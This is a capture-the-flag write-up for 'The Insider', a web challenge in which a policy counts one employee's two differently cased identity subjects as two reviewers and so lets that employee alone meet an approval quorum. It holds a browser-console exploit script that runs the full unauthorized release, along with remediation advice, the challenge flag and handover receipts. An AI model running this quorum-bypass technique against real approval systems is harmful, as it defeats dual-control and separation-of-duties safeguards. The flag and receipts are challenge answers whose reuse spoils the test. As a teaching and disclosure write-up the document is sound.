# The Insider - Emergency Release Record

## Challenge summary

**Category:** Web / authorization / identity correlation  
**Points:** 300  
**Target:** Emergency Review Desk in the HX-1977 challenge appliance  
**Result:** Solved and accepted by the case board  
**Final flag:** `flag{insider_5594d69fa2cb5e59}`

The challenge asked us to reconstruct the effective state of an emergency release from a transaction journal, identify the policy that actually controlled the release, and determine whether its approval quorum was legitimate.

The central vulnerability was an **identity canonicalization and quorum-counting flaw**. Policy `P19` counted reviewers by their case-sensitive `subject` strings. The same human employee appeared in two identity realms with differently cased subjects:

```text
Federated realm: rv-46e9334a6c
On-prem realm:   RV-46e9334a6c
Employee number: 46e9334a6c in both records
```

Because the federated realm used lowercase normalization while the on-prem realm preserved case, the policy treated these two records as two independent reviewers. In reality, both records represented the same employee. We collected the two signed review tickets, submitted both as quorum approvals, and reproduced the unauthorized release path.

## Final result and retained handover

The release endpoint returned:

```json
{
  "ok": true,
  "flag": "flag{insider_5594d69fa2cb5e59}",
  "notice": "Submit this flag on the case board. Your case handover becomes available there after solve or skip."
}
```

After the flag was submitted successfully, the case board produced the handover for the next stage:

```json
{
  "case": "insider",
  "receipt": "7f742f77f5d76059453a4b3e0b99e37628258eba8216d17a125da4676cc4544a",
  "revision": 5
}
```

## 1. Beginner-friendly background

Three ideas are important for understanding this challenge.

### 1.1 A journal is not the same as current state

The SQLite database did not contain a simple row saying, "this is the current release." It contained a chronological journal of attempted transactions.

A transaction could:

- begin from the last committed state;
- modify fields inside a private snapshot;
- compare a field with an expected value;
- commit the snapshot;
- roll it back; or
- remain incomplete.

This means the last plausible-looking line is not necessarily effective. A later transaction may have failed or may never have committed.

### 1.2 What is compare-and-swap?

`CAS` means **compare-and-swap**. It is commonly used to prevent stale updates.

A journal operation such as:

```text
CAS revision: expected 2, write 3
```

means:

1. check whether the transaction snapshot currently contains revision `2`;
2. if it does, change the revision to `3`;
3. if it does not, mark the whole transaction invalid.

The acquisition instructions explicitly said that a failed CAS invalidated the entire transaction, including writes that appeared after the failed comparison. A later `COMMIT` line could not rescue an invalid transaction.

### 1.3 A directory account is not always a unique person

Large organizations often use multiple identity systems. One employee might have an on-premises directory identity and a federated cloud identity.

The following values answer different questions:

- `object_id`: which directory object is this?
- `subject`: which login subject or principal name is this?
- `employee_number`: which human employee does this belong to?

Counting directory objects or subject spellings can accidentally count one person more than once. A security quorum must count independent people, not merely independent strings.

## 2. Entry point and prerequisite handover

The Insider landing page exposed its retained interface contract at:

```text
GET /insider/interface
```

The contract described these operations:

```json
{
  "POST /insider/assigned": {
    "handover": "Portal handover"
  },
  "POST /insider/acquisition": {
    "handover": "Portal handover"
  },
  "POST /insider/recover": {
    "handover": "Portal handover",
    "manifest": "effective binding object"
  },
  "POST /insider/review": {
    "handover": "Portal handover",
    "object_id": "archival object reference"
  },
  "POST /insider/approve": {
    "handover": "Portal handover",
    "review_ticket": "signed review credential",
    "manifest": "effective binding object"
  },
  "POST /insider/admin": {
    "handover": "Portal handover",
    "manifest": "effective binding object"
  }
}
```

The previous Portal stage had already been solved. The case board's **Recover case handover** button returned:

```json
{
  "case": "portal",
  "receipt": "7afa14b55d9d208ceb59eff40bf2ba22b1b8649c74efb9c0a4fe9f4fd5a5b4e6",
  "revision": 5
}
```

The Insider API expected the `receipt` string as the `handover` value. Passing the whole JSON object resulted in:

```json
{"detail":"invalid case handover"}
```

Passing only the receipt succeeded:

```javascript
const handover =
  "7afa14b55d9d208ceb59eff40bf2ba22b1b8649c74efb9c0a4fe9f4fd5a5b4e6";

const response = await fetch("/insider/assigned", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ handover })
});

console.log(await response.json());
```

Response:

```json
{
  "review": 49993,
  "case": "0144b1151f1c",
  "acquisition": "POST /insider/acquisition",
  "status": "live directory view unavailable"
}
```

This established the assigned case ID:

```text
0144b1151f1c
```

The phrase `live directory view unavailable` was also an important hint: the retained acquisition, rather than a live UI directory, was the authoritative evidence source.

## 3. Acquiring and preserving the evidence

The acquisition endpoint returned a ZIP archive:

```javascript
const response = await fetch("/insider/acquisition", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ handover })
});

const archive = await response.blob();
const url = URL.createObjectURL(archive);
const link = document.createElement("a");
link.href = url;
link.download = "insider-acquisition.zip";
link.click();
URL.revokeObjectURL(url);
```

The archive contained:

```text
insider-acquisition/
|-- acquisition.txt
|-- deployments.json
|-- directory.json
`-- workflow.db
```

Evidence hashes were recorded so that later analysis could be tied to the exact files received:

```text
3e05716a75e7269739633e9c4de35a3c8d70eaf1a2986803861398f8efd3ba4b  insider-acquisition.zip
15fefc78af8845a57a0ab9e51db25f6f7139e0688880dbee04145f16bd577f26  workflow.db
d76b48278b231d8bc4bf7fd4a75bfddb84978d44ec97be271471e9d5f91bf15c  directory.json
c607151a9ce49ca8871e4d9e46a93cecf4328bacd1d04cc939598371641cce0b  deployments.json
8a68938a5dae093733afc16bfe2bc0c06f4a0aa6b1f8dea4a47072205a2dc62c  acquisition.txt
```

On Windows, the hashes can be reproduced with:

```powershell
Get-FileHash -Algorithm SHA256 `
  .\insider-acquisition.zip, `
  .\insider-acquisition\workflow.db, `
  .\insider-acquisition\directory.json, `
  .\insider-acquisition\deployments.json, `
  .\insider-acquisition\acquisition.txt
```

## 4. Reading the acquisition rules

`acquisition.txt` defined the authoritative replay rules:

```text
BEGIN snapshots the last committed case state.
SET modifies the transaction snapshot.
CAS writes only when the expected value equals the snapshot field.
A failed CAS invalidates the entire transaction.
COMMIT publishes a valid transaction.
ROLLBACK discards a transaction.
Uncommitted transactions are ineffective.
```

It also stated that:

- the directory's exported subject spellings must be preserved;
- archive references identify retained objects but are not approvals by themselves;
- the active policy's `export_binding` fields must be present in the manifest; and
- a policy body is not itself an approval credential.

These rules prevented several shortcuts. We could not pick the last row, could not use an object ID as an approval, and could not submit the JSON policy definition as if it were a signed ticket.

## 5. Reconstructing the effective workflow state

### 5.1 Database schema

The SQLite database contained one table:

```sql
CREATE TABLE journal(
  sequence INTEGER PRIMARY KEY,
  transaction_id TEXT,
  case_id TEXT,
  operation TEXT,
  field TEXT,
  value_json TEXT,
  expected_json TEXT
);
```

Only rows belonging to the assigned case were relevant:

```sql
SELECT
  sequence,
  transaction_id,
  operation,
  field,
  value_json,
  expected_json
FROM journal
WHERE case_id = '0144b1151f1c'
ORDER BY sequence;
```

### 5.2 Transaction summary

The target case's journal reduced to the following sequence:

| Sequences | Important operations | Result |
|---|---|---|
| 351-358 | Initialize revision 0, owner `46e9334a6c`, request `042e4765d649df`, policy P17, then commit | Effective |
| 359-364 | CAS revision 0 -> 1, change to P18, then commit | Effective |
| 365-370 | CAS revision 1 -> 2, change to P19, status approved, then commit | Effective |
| 371-377 | CAS 2 -> 3 succeeds, but a second CAS expects 42 while the snapshot is 3 | Entire transaction invalid |
| 378-383 | CAS expects revision 3, but committed revision is still 2 | Invalid despite COMMIT |
| 384-389 | CAS expects revision 4 and the transaction later rolls back | Discarded |
| 390-395 | CAS expects revision 5, but committed revision is 2 | Invalid despite COMMIT |
| 396-400 | CAS revision 2 -> 3, keep P19, set `pending-quorum`, then commit | Effective |

The trap is visible here: the journal contains later-looking `approved` records for other policies, but none became committed state. The failed CAS at sequence 376 invalidated all writes in its transaction. That left the committed revision at `2`, causing several later comparisons to fail as well.

### 5.3 Reproduction script

The following Python script performs a deterministic replay for the assigned case:

```python
import json
import sqlite3

TARGET_CASE = "0144b1151f1c"

database = sqlite3.connect("insider-acquisition/workflow.db")
rows = database.execute(
    """
    SELECT sequence, transaction_id, operation,
           field, value_json, expected_json
    FROM journal
    WHERE case_id = ?
    ORDER BY sequence
    """,
    (TARGET_CASE,),
).fetchall()

committed = {}
snapshot = None
valid = False

for sequence, txid, operation, field, value_json, expected_json in rows:
    value = json.loads(value_json) if value_json is not None else None
    expected = (
        json.loads(expected_json) if expected_json is not None else None
    )

    if operation == "BEGIN":
        snapshot = dict(committed)
        valid = True

    elif operation == "SET":
        snapshot[field] = value

    elif operation == "CAS":
        if snapshot.get(field) == expected:
            snapshot[field] = value
        else:
            valid = False

    elif operation == "COMMIT":
        if valid:
            committed = snapshot
        snapshot = None

    elif operation == "ROLLBACK":
        snapshot = None

print(json.dumps(committed, indent=2, sort_keys=True))
```

Output:

```json
{
  "export_root": "751a4690aa0a6da49e4c",
  "owner": "46e9334a6c",
  "policy": "P19",
  "request": "042e4765d649df",
  "revision": 3,
  "status": "pending-quorum"
}
```

This was the effective incident state. It was not an estimate and did not depend on selecting whichever line looked newest.

## 6. Constructing the exact manifest

`deployments.json` showed that the P19 policy required these fields in `export_binding`:

```json
[
  "case",
  "revision",
  "request",
  "policy",
  "export_root"
]
```

Combining the assigned case ID with the replayed state produced:

```json
{
  "case": "0144b1151f1c",
  "revision": 3,
  "request": "042e4765d649df",
  "policy": "P19",
  "export_root": "751a4690aa0a6da49e4c"
}
```

This object was submitted to `/insider/recover`:

```javascript
const manifest = {
  case: "0144b1151f1c",
  revision: 3,
  request: "042e4765d649df",
  policy: "P19",
  export_root: "751a4690aa0a6da49e4c"
};

const response = await fetch("/insider/recover", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ handover, manifest })
});

console.log(await response.json());
```

Response:

```json
{
  "accepted": true,
  "archive_state": "retained objects available"
}
```

This step bound the rest of the investigation to the exact effective case, revision, request, policy, and export root.

## 7. Analyzing policy P19

The three retained deployments were:

| Policy | Quorum | Count key | Directory join | Federated normalizer | On-prem normalizer |
|---|---:|---|---|---|---|
| P17 | 2 | `employee_number` | `owner = employee_number` | `ascii_lower` | `identity` |
| P18 | 2 | `employee_number` | `owner = employee_number` | `ascii_lower` | `identity` |
| P19 | 2 | `subject` | `owner = employee_number` | `ascii_lower` | `identity` |

The effective workflow state explicitly selected P19. Its relevant definition was:

```json
{
  "id": "P19",
  "quorum": 2,
  "count_key": "subject",
  "directory_join": "owner = employee_number",
  "federated_normalizer": "ascii_lower",
  "onprem_normalizer": "identity",
  "delegated_scope": "review.read"
}
```

The owner from the replayed workflow was:

```text
46e9334a6c
```

Searching `directory.json` for that employee number returned two records:

| Realm | Employee number | Subject | Object ID |
|---|---|---|---|
| Federated | `46e9334a6c` | `rv-46e9334a6c` | `a99cc695bf06389f3d5a` |
| On-prem | `46e9334a6c` | `RV-46e9334a6c` | `ae95670c58b2db7cc59a` |

Both records were active members of `readers`, and neither was tombstoned.

### Why the quorum was wrong

P19 first joined records using `owner = employee_number`. That correctly found the two directory objects belonging to employee `46e9334a6c`.

It then counted by `subject`, not by `employee_number`:

```text
federated ascii_lower("rv-46e9334a6c") = "rv-46e9334a6c"
on-prem identity("RV-46e9334a6c")       = "RV-46e9334a6c"
```

String comparison sees two values:

```text
"rv-46e9334a6c" != "RV-46e9334a6c"
```

The business identity comparison sees only one employee:

```text
employee_number == "46e9334a6c" for both records
```

The policy therefore confused **two directory subjects** with **two independent human approvers**. This is the vulnerability.

It is closely related to:

- inconsistent identity canonicalization;
- duplicate-account or multi-realm identity confusion;
- authorization based on presentation strings instead of immutable identities; and
- quorum bypass through incorrect deduplication.

No signature was forged and no review ticket was modified. The server issued two valid credentials and then counted them incorrectly.

## 8. Recovering both signed review credentials

After the manifest was accepted, each retained directory object could be passed to `/insider/review`.

Federated object:

```javascript
await fetch("/insider/review", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    handover,
    object_id: "a99cc695bf06389f3d5a"
  })
});
```

On-prem object:

```javascript
await fetch("/insider/review", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    handover,
    object_id: "ae95670c58b2db7cc59a"
  })
});
```

Each response returned a signed `read_ticket`. The two payloads were bound to the same case, policy, revision, root and delegated scope. Their principal values differed only in case:

```json
{
  "case": "0144b1151f1c",
  "policy": "P19",
  "principal": "rv-46e9334a6c",
  "revision": 3,
  "root": "751a4690aa0a6da49e4c",
  "scope": "review.read"
}
```

```json
{
  "case": "0144b1151f1c",
  "policy": "P19",
  "principal": "RV-46e9334a6c",
  "revision": 3,
  "root": "751a4690aa0a6da49e4c",
  "scope": "review.read"
}
```

The signed suffixes were left intact and were not guessed or altered. Each complete ticket was submitted once to `/insider/approve` with the same effective manifest.

Both responses were:

```json
{"accepted":true}
```

After the second approval, the flawed P19 counter believed quorum `2` had been reached.

## 9. End-to-end reproduction of the unauthorized path

The following browser-console script reproduces the stateful release path after the evidence has been analyzed. It obtains fresh signed tickets instead of hard-coding their signatures.

Run it only from the authenticated challenge origin after completing the manual login:

```javascript
const handover =
  "7afa14b55d9d208ceb59eff40bf2ba22b1b8649c74efb9c0a4fe9f4fd5a5b4e6";

const manifest = {
  case: "0144b1151f1c",
  revision: 3,
  request: "042e4765d649df",
  policy: "P19",
  export_root: "751a4690aa0a6da49e4c"
};

async function post(path, body) {
  const response = await fetch(path, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });

  const text = await response.text();
  let data;

  try {
    data = JSON.parse(text);
  } catch {
    data = text;
  }

  if (!response.ok) {
    throw new Error(`${path} returned ${response.status}: ${text}`);
  }

  return data;
}

// Bind the investigation to the reconstructed effective state.
console.log(
  await post("/insider/recover", { handover, manifest })
);

// These are two directory objects for the same employee.
const objectIds = [
  "a99cc695bf06389f3d5a",
  "ae95670c58b2db7cc59a"
];

const tickets = [];

for (const object_id of objectIds) {
  const review = await post("/insider/review", {
    handover,
    object_id
  });

  tickets.push(review.read_ticket);
}

// P19 incorrectly counts the differently cased subjects as two principals.
for (const review_ticket of tickets) {
  console.log(
    await post("/insider/approve", {
      handover,
      review_ticket,
      manifest
    })
  );
}

// Quorum now appears satisfied, so the administrative release succeeds.
console.log(
  await post("/insider/admin", { handover, manifest })
);
```

Final response:

```json
{
  "ok": true,
  "flag": "flag{insider_5594d69fa2cb5e59}",
  "notice": "Submit this flag on the case board. Your case handover becomes available there after solve or skip."
}
```

The flag was then submitted once through the authenticated case board. The board displayed `Flag recorded`, reduced the remaining submission counter, and unlocked the next main-chain choices.

## 10. What did not work, and why

### Passing the whole Portal handover object

The API contract used the word `handover`, but the actual field expected the receipt string. Passing the complete `{case, receipt, revision}` object returned `invalid case handover`.

### Selecting the last plausible journal record

Several later records contained attractive values such as `approved`, P17, P18 or P19. They were decoys unless their entire transaction remained valid and committed. Failed comparisons, rollback and stale expected revisions prevented them from becoming effective.

### Treating COMMIT as automatically successful

A `COMMIT` operation only published a valid transaction. If an earlier CAS failed, the transaction stayed invalid. This is why sequences 371-377, 378-383 and 390-395 changed nothing even though some ended with `COMMIT`.

### Treating an object ID as authorization

The directory object IDs identified retained records. They did not authorize the final action. The correct path was to use each object ID at `/insider/review`, receive a server-signed credential, and submit that credential at `/insider/approve`.

### Treating the policy body as a credential

Knowing that P19 required quorum 2 was not proof that two reviews existed. The server required signed review tickets bound to the correct case, revision, policy and export root.

### Attempting to forge or edit tickets

Ticket modification was unnecessary and would have broken the signature. The flaw existed in how two genuine tickets were deduplicated, not in their cryptographic integrity.

## 11. Vulnerability impact

The intended control required two independent reviewers. The actual implementation required two distinct normalized subject strings.

An employee with identities in multiple realms could therefore satisfy a two-person quorum alone. In a real emergency-release system, this could permit:

- unauthorized document export;
- bypass of dual-control requirements;
- self-approval through linked accounts;
- fraudulent administrative release;
- failure of separation-of-duties controls; and
- misleading audit logs that appear to show multiple reviewers.

This is especially serious because every individual operation can look legitimate:

- both directory records are real;
- both review tickets are correctly signed;
- both approvals are accepted normally; and
- the manifest is correctly bound.

The failure occurs only when the system decides whether those approvals represent independent humans.

## 12. Recommended remediation

### Count an immutable person identifier

The quorum key should be `employee_number`, or another stable global person ID, rather than a case-sensitive login subject.

For this policy, the two approvals should deduplicate to:

```text
unique employee_number set = { "46e9334a6c" }
count = 1
required quorum = 2
release denied
```

### Use one canonicalization rule

If subjects must be compared, apply a single explicit canonicalization rule across all identity realms before comparison. Realm-specific normalization is dangerous when the result is used as a security boundary.

Canonicalization alone is not always sufficient because two legitimately different account names may still belong to one person. The final quorum decision should therefore use the authoritative human identity mapping.

### Enforce distinct-person approval atomically

The approval store should enforce a uniqueness constraint similar to:

```text
(case, revision, policy, export_root, employee_number)
```

Quorum evaluation and final release should occur in one transaction so that concurrent approvals or state changes cannot create another race.

### Bind and revalidate every security-relevant field

Each approval should be bound to:

- case;
- revision;
- request;
- policy;
- export root;
- reviewer employee identity; and
- expiry.

The final administrative release should revalidate the effective workflow state and reviewer independence immediately before release.

### Improve audit visibility

Audit records should display both the login subject and the resolved employee identity. A warning should be generated when multiple approvals originate from different directory objects linked to the same employee.

## 13. How AI was used during the investigation

AI was used as a structured investigation assistant. It accelerated evidence handling, but the retained files and server responses remained authoritative.

### Browser automation with Playwright MCP

The participant completed authentication manually. After login, Playwright MCP was used to:

1. open the Insider challenge and its interface contract;
2. recover the already-solved Portal handover from the case board;
3. call the assigned-case and acquisition endpoints;
4. save the ZIP response without exposing credentials;
5. submit the reconstructed manifest;
6. request both signed review tickets;
7. submit the two approvals;
8. call the administrative release endpoint; and
9. submit the confirmed flag on the case board.

AI did not guess, extract or retain the participant's login credentials.

### Evidence triage

AI recognized the acquisition response as a ZIP from its `PK` file signature and identified the embedded files. It then separated the evidence into three questions:

- What state actually committed?
- Which policy controlled that state?
- Did the policy count independent people correctly?

This avoided mixing workflow reconstruction with vulnerability exploitation.

### Transaction replay assistance

AI translated the prose transaction rules into a small replay script and checked each target-case transaction in sequence. This made the result reproducible and exposed why the later-looking records were ineffective.

The script's output was compared directly with the journal rows. The conclusion was based on deterministic replay, not on the model's intuition.

### Identity correlation

AI filtered the directory by the committed owner employee number and placed the two matching records side by side. That made the case difference in `subject` immediately visible while confirming that both rows shared the same employee number.

The policy JSON was then checked field by field: `directory_join`, `count_key`, both normalizers, quorum, delegated scope and export binding.

### Safe reproduction

AI used the application-provided interface only inside the designated CTF appliance. It did not scan unrelated systems or use external credentials. Each state-changing request followed the challenge's documented workflow, and the returned flag was submitted only after the full evidence chain was understood.

### Why human verification still mattered

AI can quickly suggest that differently cased names are suspicious, but that observation alone is not proof. The decisive evidence was:

1. both directory rows had the same `employee_number`;
2. P19 counted `subject` instead of `employee_number`;
3. the two realm-specific normalizers preserved different spellings;
4. the server issued two signed tickets;
5. both approvals were accepted; and
6. the final release returned the flag.

This evidence-backed process is important in a prize write-up because it distinguishes a demonstrated vulnerability from a plausible theory.

## 14. Lessons learned

1. **Replay transactional evidence; do not read it like a log of facts.** Failed, rolled-back and unfinished transactions are not current state.
2. **A COMMIT line does not prove success.** Earlier validation failures can invalidate the whole transaction.
3. **Bind actions to exact state.** Case, revision, request, policy and export root all mattered.
4. **Directory objects are not necessarily people.** Multiple objects can represent one employee.
5. **Quorum means independent actors.** Counting strings, sessions or accounts is weaker than counting authoritative human identities.
6. **Canonicalization is security-sensitive.** Different normalization rules across identity realms can create distinct values for the same principal.
7. **Valid signatures do not guarantee valid authorization.** Both tickets were genuine; the bug was in how they were counted.
8. **Preserve evidence before analysis.** Hashing the acquisition makes the reconstruction auditable.
9. **Use AI to accelerate correlation, not to replace proof.** Every important conclusion was checked against the exported records or live challenge responses.

## 15. Final answer

```text
flag{insider_5594d69fa2cb5e59}
```
